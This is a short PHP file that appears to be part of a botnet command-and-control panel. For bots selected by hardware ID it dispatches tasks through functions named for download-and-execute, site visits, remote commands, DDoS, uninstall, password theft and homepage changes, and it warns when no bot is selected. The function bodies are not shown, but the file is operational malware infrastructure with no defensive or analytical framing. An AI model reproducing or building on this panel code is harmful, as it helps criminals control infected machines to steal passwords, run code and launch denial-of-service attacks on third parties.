<?php
include '../inc/config.php';
include '../inc/functions.php';
AuthenticatedCheck('LoggedOut');

if(isset($_POST['hwid']) && count($_POST['hwid']) > 0)
{
    DLExecute();
    DLVisit();
    DLCMD();
    DLDDoS();
    DLUnin();
    DLPass();
    DLHome();
}else echo "<font color='red'>Select atleast one bot</font>";